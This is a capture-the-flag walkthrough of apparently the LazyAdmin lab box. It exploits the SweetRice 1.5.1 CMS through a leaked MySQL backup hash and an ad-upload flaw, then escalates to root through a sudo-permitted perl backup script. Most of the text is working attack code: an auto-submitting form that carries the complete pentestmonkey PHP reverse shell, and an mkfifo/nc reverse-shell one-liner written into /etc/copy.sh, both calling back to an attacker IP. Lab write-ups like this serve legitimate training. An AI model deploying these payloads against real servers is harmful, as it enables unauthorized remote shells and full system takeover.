Starting off with an nmap scan 

```nmap -sC -sV -O 10.10.14.115```

Just 2 ports open, 22 and 80 which indicate SSH and an HTTP server respectively.

Let's check out the http server...we're greeted by the default Apache2 ubuntu page. We'll run Dirb to check for any hidden directories.

`dirb http://10.10.14.115 /usr/share/dirb/wordlists/big.txt`

And we'll also add the -X .php option since this is an apache server.

`dirb http://10.10.14.115 /usr/share/dirb/wordlists/big.txt -X .php`

We found a directory at http:/10.10.14.115/content

Looks like this page is using a website management system called "SweetRice". Let's look it up on exploit-db.

I couldn't find a version number but the majority of the exploits seem to affect version 1.5.1, let's try and use an arbitrary file upload exploit to upload a reverse shell.

We'll use https://www.exploit-db.com/exploits/40716

It looks like we need to be authenticated for this exploit to work. We could try and brute-force the login but let's try another attack vector first. Our dirb scan found several directories within /content

Three of these stand out to me. `/content/as` `/content/inc` and `/content/as/lib`

`/content/as` is the admin sign-in panel to access the dashboard.

`/content/as/lib` contains PHP scripts that provide functionality to the website.

`/content/inc` also contains PHP scripts but it also contains a few directories. One of them being `mysql_backup/` We can try and look for some credentials stored in the backup. Let's download the file to our Attackbox and open it up with a text editor.

`"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\`

Looks like we found some hard-coded credentials. It looks like an MD5 hash so we'll need to crack it. I opted to use crackstation for this.

Now that we have some credentials, let's use them to login to the admin panel we saw earlier.

Let's use https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html to try and get a shell on the system. (We've also cofirmed the version number as 1.5.1)

After slightly modifying the exploit to suit our needs, we set up a listener on our attackbox and uploaded our php reverse shell. We can now navigate to http://10.10.14.115/content/inc/ads/ to run our shell.

This is what our working exploit looked like:

```<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.14.115/content/as/?type=ad&mode=save"
method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked2"/>
<textarea type="hidden" name="adv">
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.102.213';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```


We now have a low-priv shell on the system. Let's first grab the user flag and then work on escalating our privileges.

`find / -type f -name user.txt 2>/dev/null`

And we got a hit at `/home/itguy/user.txt`

Let's work on the root flag now.

`sudo -l` to check our current privileges.

Looks like we can run perl, and a perl backup script as sudo. We'll check our trusty https://gtfobins.github.io/ for an exploit.

`sudo perl -e 'exec "/bin/sh";'`

We get the following error:

> sudo: no tty present and no askpass program specified

The other script "backup.pl" appears to use perl to execute a script located at "/etc/copy.sh"

The script:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`

This looks familiar...it appears to be a reverse shell conveniently waiting for us to modify it for our use case. We can't use `nano` so we'll use `echo` to modify it.

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.102.213 5554 >/tmp/f" > /etc/copy.sh

Remember to set up the listener on our Attackbox

`nc -lvnp 5554`

Also, remember that we have sudo permission for /home/itguy/backup.pl which is the perl script which runs /copy.sh

We need to run that script as sudo, otherwise we won't get the root shell, it'll just be a low-priv shell.

`sudo perl /home/itguy/backup.pl`

Now that we're root, let's find that flag.

`find / -type f -name root.txt 2>/dev/null`

Done!

This box was a little more challenging than the others I've done so far. I had research how to get an initial foothold (through the mySQL backup file). I also didn't recognize the contents of `copy.sh` as a reverse shell at first so I got stuck on that part too. I definitely learned a lot though, and I'm looking forward to the next box!
